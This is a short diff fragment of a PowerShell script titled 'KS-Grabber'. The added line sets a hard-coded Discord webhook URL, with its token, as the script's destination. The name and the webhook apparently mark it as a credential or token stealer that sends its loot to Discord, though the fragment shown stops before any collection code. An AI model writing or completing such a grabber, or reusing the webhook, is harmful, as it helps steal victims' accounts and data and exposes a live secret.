@@ -1,4 +1,5 @@
 <# Visual #>
+$hookUrl = 'https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC';
 $Host.UI.RawUI.WindowTitle = "✨ KS-Grabber"
 $softwareVer = "1.2"
 Write-Output "
